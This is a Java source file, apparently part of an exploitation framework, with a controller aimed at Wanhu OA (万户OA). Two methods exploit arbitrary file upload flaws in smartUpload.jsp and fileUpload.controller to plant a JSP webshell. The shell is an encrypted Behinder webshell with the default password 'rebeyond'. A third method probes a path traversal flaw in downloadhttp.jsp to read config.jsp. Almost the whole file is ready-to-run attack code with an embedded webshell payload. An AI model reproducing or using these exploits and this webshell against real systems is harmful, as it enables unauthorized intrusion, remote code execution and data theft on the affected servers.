package com.achuna33.Controllers;

import com.achuna33.SupportType.Poc_Exp;
import com.achuna33.SupportType.SupportVul;
import com.achuna33.Utils.Cache;
import com.achuna33.Utils.HttpRequest;
import com.achuna33.Utils.Response;
import com.achuna33.Utils.Utils;

import java.io.FileInputStream;
import java.net.MalformedURLException;

@BasicMapping(uri = "万户")
public class WanhuController extends Controller implements BasicController{
    public WanhuController(){

    }
@VulnerabilityDescriptionMapping(Description = "万户OA smartUpload.jsp 任意文件上传漏洞",SupportVulType = SupportVul.UploadFile)
    public void vul_smartUpload(Poc_Exp type, String target,Object... args) throws MalformedURLException {
    Cache.uiController.logTextArea.appendText("\n开始检测：  vul_smartUpload");
    switch (type){
        case EXP:
            String path = null;
            String mypayload = null;
            try {
                path = (String) args[0];
                try {
                    byte[] bytes = Utils.readFile(path);
                    mypayload = new String(bytes);
                }catch (Exception e){
                    WriteExpLog("\n [*] 文件读取失败");
                }
            }catch (Exception e){

            }
            String payload = "<%@page import=\"java.util.*,javax.crypto.*,javax.crypto.spec.*\"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals(\"POST\")){String k=\"e45e329feb5d925b\";/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/session.putValue(\"u\",k);Cipher c=Cipher.getInstance(\"AES\");c.init(2,new SecretKeySpec(k.getBytes(),\"AES\"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>\n";

            if (mypayload!=null){
                payload = mypayload;
            }else {
                WriteExpLog("\n [*] 默认shell 为冰蝎shell 密码 rebeyond");
            }
            String url = "/defaultroot/extension/smartUpload.jsp?path=information&mode=add&fileName=infoPicName&saveName=infoPicSaveName&tableName=infoPicTable&fileMaxSize=0&fileMaxNum=0&fileType=gif,jpg,bmp,jsp,png&fileMinWidth=0&fileMinHeight=0&fileMaxWidth=0&fileMaxHeight=0";
            HttpRequest httpRequest1 = new HttpRequest(target+url);
            httpRequest1.addHeaders("Content-Type","multipart/form-data; boundary=----WebKitFormBoundarynNQ8hoU56tfSwBVU");
            String data1 = "-----------------------------8993010833740027670183720397\r\n" +
                    "Content-Disposition: form-data; name=\"photo\"; filename=\"shell.jsp\"\r\n" +
                    "Content-Type: application/octet-stream\r\n" +
                    "\r\n" +
                    payload+"\r\n" +
                    "-----------------------------8993010833740027670183720397\r\n" +
                    "Content-Disposition: form-data; name=\"continueUpload\"\r\n" +
                    "\r\n" +
                    "1\r\n" +
                    "-----------------------------8993010833740027670183720397\r\n" +
                    "Content-Disposition: form-data; name=\"submit\"\r\n" +
                    "\r\n" +
                    "上传继续\r\n" +
                    "-----------------------------8993010833740027670183720397--\r\n";
            Response response1 = httpRequest1.Post(data1);
            if (response1.statusCode==200){
                WriteExpLog("\n"+response1.responseBody);
                String[] split = response1.responseBody.split("=\";\"");
                String shellpath = split[1].split("\";\"")[0];
                WriteExpLog("\n[*] shellpath :"+shellpath);
            }
            break;
        case POC:
            HttpRequest httpRequest = new HttpRequest(target+"/defaultroot/extension/smartUpload.jsp?path=information&fileName=infoPicName&saveName=infoPicSaveName&tableName=infoPicTable&fileMaxSize=0&fileMaxNum=0&fileType=gif,jpg,bmp,jsp,png&fileMinWidth=0&fileMinHeight=0&fileMaxWidth=0&fileMaxHeight=0");
            String data = "";
            Response result = httpRequest.Get(data);
            if(result.responseBody.contains("continueUpload") && result.statusCode==200){
                WriteLog(" 存在漏洞");
            }else {
                WriteLog(" 不存在漏洞");
            }
            WriteLog("\n"+result.responseBody);
    }
}

@VulnerabilityDescriptionMapping(Description = "万户OA fileUpload.controller 任意文件上传漏洞",SupportVulType = SupportVul.UploadFile)
    public void vul_fileUpload(Poc_Exp type, String target,Object... args) throws MalformedURLException {
    Cache.uiController.logTextArea.appendText("\n开始检测：  vul_fileUpload");
    switch (type){
        case EXP:
            String path = null;
            String mypayload = null;
            try {
                path = (String) args[0];
                try {
                    byte[] bytes = Utils.readFile(path);
                    mypayload = new String(bytes);
                }catch (Exception e){
                    WriteExpLog("\n [*] 文件读取失败");
                }
            }catch (Exception e){

            }
            String payload = "<%@page import=\"java.util.*,javax.crypto.*,javax.crypto.spec.*\"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals(\"POST\")){String k=\"e45e329feb5d925b\";/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/session.putValue(\"u\",k);Cipher c=Cipher.getInstance(\"AES\");c.init(2,new SecretKeySpec(k.getBytes(),\"AES\"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>\n";

            if (mypayload!=null){
                payload = mypayload;
            }else {
                WriteExpLog("\n [*] 默认shell 为冰蝎shell 密码 rebeyond");
            }
            HttpRequest httpRequest3 = new HttpRequest(target+"/defaultroot/upload/fileUpload.controller");
            String data1 = "--KPmtcldVGtT3s8kux_aHDDZ4-A7wRsken5v0\r\n" +
                    "Content-Disposition: form-data; name=\"file\"; filename=\"cmd.jsp\"\r\n" +
                    "Content-Type: application/octet-stream\r\n" +
                    "Content-Transfer-Encoding: binary\r\n" +
                    "\r\n" +
                    payload+"\r\n" +
                    "--KPmtcldVGtT3s8kux_aHDDZ4-A7wRsken5v0--\r\n";
            httpRequest3.addHeaders("Content-Type","multipart/form-data; boundary=KPmtcldVGtT3s8kux_aHDDZ4-A7wRsken5v0");
            httpRequest3.addHeaders("Connection","Keep-Alive");
            Response result1 = httpRequest3.Post(data1);
            if(result1.responseBody.contains("success") && result1.statusCode==200){
                WriteExpLog("\n[*] 存在漏洞\n"+result1.responseBody);
            }else {
                WriteExpLog("\n 不存在漏洞\n"+result1.responseBody);
            }

            break;
        case POC:
            HttpRequest httpRequest = new HttpRequest(target+"/defaultroot/upload/fileUpload.controller");
            String data = "--KPmtcldVGtT3s8kux_aHDDZ4-A7wRsken5v0\n" +
                    "Content-Disposition: form-data; name=\"file\"; filename=\"cmd.jsp\"\n" +
                    "Content-Type: application/octet-stream\n" +
                    "Content-Transfer-Encoding: binary\n" +
                    "\n" +
                    "<%@page import=\"java.util.*,javax.crypto.*,javax.crypto.spec.*\"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals(\"POST\")){String k=\"e45e329feb5d925b\";/*......tas9er*/session.putValue(\"u\",k);Cipher c=Cipher.getInstance(\"AES\");c.init(2,new SecretKeySpec(k.getBytes(),\"AES\"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>\n" +
                    "--KPmtcldVGtT3s8kux_aHDDZ4-A7wRsken5v0--";
            httpRequest.addHeaders("Content-Type","multipart/form-data; boundary=KPmtcldVGtT3s8kux_aHDDZ4-A7wRsken5v0");
            httpRequest.addHeaders("Connection","Keep-Alive");
            Response result = httpRequest.Post(data);
            if(result.responseBody.contains("success") && result.statusCode==200){
                WriteLog("\n 存在漏洞\n"+result.responseBody);
            }else {
                WriteLog("\n 不存在漏洞\n"+result.responseBody);
            }
    }
}

    @VulnerabilityDescriptionMapping(Description = "万户OA downloadhttp.jsp 任意文件下载漏洞",SupportVulType = SupportVul.信息泄露)
    public void vul_downloadhttp(Poc_Exp type, String target,Object... args) throws MalformedURLException {
        Cache.uiController.logTextArea.appendText("\n开始检测：  万户OA downloadhttp.jsp 任意文件下载漏洞");
        String url = "/defaultroot/site/templatemanager/downloadhttp.jsp?fileName=../public/edit/jsp/config.jsp";
        switch (type){
            case EXP:
                break;
            case POC:
                HttpRequest httpRequest = new HttpRequest(target+url);

                Response result = httpRequest.Get("");
                if(result.statusCode==200){
                    WriteLog("\n[*] 访问地址："+target+url );
                    WriteLog("\n[*] 存在漏洞\n"+result.responseBody);
                }else {
                    WriteLog("\n[*] 不存在漏洞\n"+result.responseBody);
                }
        }
    }


}
